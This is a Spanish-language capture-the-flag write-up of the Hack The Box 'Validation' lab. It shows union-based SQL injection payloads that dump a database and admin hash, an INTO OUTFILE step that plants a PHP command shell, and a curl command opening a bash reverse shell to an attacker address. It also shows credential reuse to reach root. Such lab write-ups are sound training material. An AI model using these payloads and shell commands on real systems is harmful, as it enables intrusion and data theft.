---
layout: single
title: Validation - Hack The Box
excerpt: "Máquina muy interesante, con la cual puedes practicar bastante SQL Injection. Tiene una dificultad de Easy por lo que no sera mucho problema hacerla."
date: 2022-03-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-validation/validation_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
   - linux
   - SQL Injection Error Based
   - SQL RCE (into outfile)
   - Information Leakage
---

![](/assets/images/htb-writeup-validation/validation_logo.png)

# Reconocimiento

Como siempre, comenzaremos efectuando un escaneo de puertos por el protocolo **TCP**, y el output lo redirigiremos al fichero `allPorts`.

```bash

h3g0c1v@kali:~/htb/validation$ nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.116 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 12:14 CET
Initiating SYN Stealth Scan at 12:14
Scanning 10.10.11.116 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.116
Discovered open port 22/tcp on 10.10.11.116
Discovered open port 80/tcp on 10.10.11.116
Discovered open port 4566/tcp on 10.10.11.116
Completed SYN Stealth Scan at 12:14, 10.83s elapsed (65535 total ports)
Nmap scan report for 10.10.11.116
Host is up, received user-set (0.036s latency).
Scanned at 2022-03-16 12:14:13 CET for 11s
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.98 seconds
           Raw packets sent: 65544 (2.884MB) | Rcvd: 65572 (2.623MB)


```

Después detectaremos la **versión** y **servicio** que corren bajo los puertos que hemos detectado abiertos.

```bash

h3g0c1v@kali:~/htb/validation$ nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN targeted                    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 12:15 CET
Nmap scan report for 10.10.11.116
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds

```

Siguiendo con el reconocimiento vamos a ver un poco más sobre esos puertos **http** abiertos usando la herramienta **whatweb**.

```bash
h3g0c1v@kali:~/htb/validation$ whatweb http://10.10.11.116     
http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]

h3g0c1v@kali:~/htb/validation$ whatweb http://10.10.11.116:8080
http://10.10.11.116:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.116], Title[502 Bad Gateway], nginx

h3g0c1v@kali:~/htb/validation$ whatweb http://10.10.11.116:4566
http://10.10.11.116:4566 [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.116], Title[403 Forbidden], nginx
```

Bien, ya podemos ir a ver que hay en cada una de las páginas web.

![](/assets/images/htb-writeup-validation/web80.png)

![](/assets/images/htb-writeup-validation/web8080.png)

![](/assets/images/htb-writeup-validation/web4566.png)

Vale, parece que las demás páginas no tienen nada interesante, aunque fuzeemos en ella, así que me quedaré con la del puerto **80**.

Vamos a intentar una inyección SQL, por lo que capturaré la petición con **burpsuite**.

![](/assets/images/htb-writeup-validation/burp.png)

Si intentamos la inyección en el campo del país, utilizando la cookie que nos establece el servidor, vemos que es vulnerable.

![](/assets/images/htb-writeup-validation/sql.png)

En este punto dumpeare la base de datos, realizando unas simples inyecciones SQL.

	- username=test&country=Brazil' union select 1-- -
	- username=test&country=Brazil' union select database()-- -
	- username=test&country=Brazil' union select (select schema_name) from information_schema.schemata-- -
	- username=test&country=Brazil' union select (select table_name) from information_schema.tables where table_schema="registration"-- -
	- username=test&country=Brazil' union select (column_name) from information_schema.columns where table_schema="registration" and table_name="registration"-- -
	- username=admin&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -

Y ahí tenemos el hash de la cuenta del administrador.

![](/assets/images/htb-writeup-validation/dumpadmin.png)


# Cracking


Ese hash lo vamos a intentar crackear con el uso de **rainbowtables**.

![](/assets/images/htb-writeup-validation/crackhash.png)

Y bueno, vemos que el admin emplea una contraseña bastante fuerte, pero lo que hemos podido crackear sin dificultad. XD


# Intrusión a la Máquina Víctima


Ahora, volviendo a las inyecciones SQL, vamos a probar si podemos meter contenido dentro de un fichero.

	- username=admin&country=Brazil' union select "probando" into outfile "/var/www/html/probando.txt"-- -

Si nos vamos a la página web, y buscamos por `/probando.txt`, que es el fichero que hemos creado y metido el texto **probando**, veremos que, efectivamente, hemos podido.
 
![](/assets/images/htb-writeup-validation/intooutfile.png)

Como podemos, meteré un contenido en PHP malicioso, para con el parámetro **cmd** pueda ejecutar comandos remotamente.

![](/assets/images/htb-writeup-validation/phpmalicososql.png)

Ahora, si nos vamos a la página web y nos metemos en `/cmd.php`, veremos que podemos ejecutar comandos

![](/assets/images/htb-writeup-validation/rce.png)

Ahora me estableceré una reverse shell con el fichero PHP malicioso, ejecutando el siguiente comando desde la terminal.

	- curl 10.10.11.116/cmd.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.3/443 0>&1"'

Y si nos vamos al lado donde estábamos en escucha, veremos que nos ha entablado la **reverse shell** correctamente.

![](/assets/images/htb-writeup-validation/reverseshell.png)

Estamos dentro. En este punto haré un tratamiento de la **tty** para tener una **shell** completamente interactiva.

![](/assets/images/htb-writeup-validation/tty.png)

Y exportaremos las dos variables.

![](/assets/images/htb-writeup-validation/exporttty.png)

Nos vamos al directorio `/home/htb/` y visualizaremos la `user.txt`.

```bash
www-data@validation:/var/www/html$ cd /home/htb/
www-data@validation:/home/htb$ cat user.txt 
aa77f865e5ad80d885ff92ca9117cdde
```

Si nos volvemos al directorio que estábamos nada más entrar, veremos que hay un `config.php`. Este fichero suele tener credenciales, por lo que vamos a verlo.

![](/assets/images/htb-writeup-validation/configphp.png)

Efectivamente, hay credenciales de la base de datos, pero realmente la base de datos ya la hemos dumpeado, por lo que en vez de utilizarla para meterme en ella, probaré a ver si se ha reutilizado la contraseña para el usuario **root**.

![](/assets/images/htb-writeup-validation/root.png)

Bueno, pues ya estamos como root. En este punto ya podemos irnos a `/root/` y visualizar la `root.txt`.

```bash
root@validation:/var/www/html# cd /root/
root@validation:~# cat root.txt 
6f2a67444026a225abecc203daf1fc3e
```

Y ésta es la máquina **Validation** , espero que te haya gustado el *write-up*, puedes ver más como éste en mi página web. :)
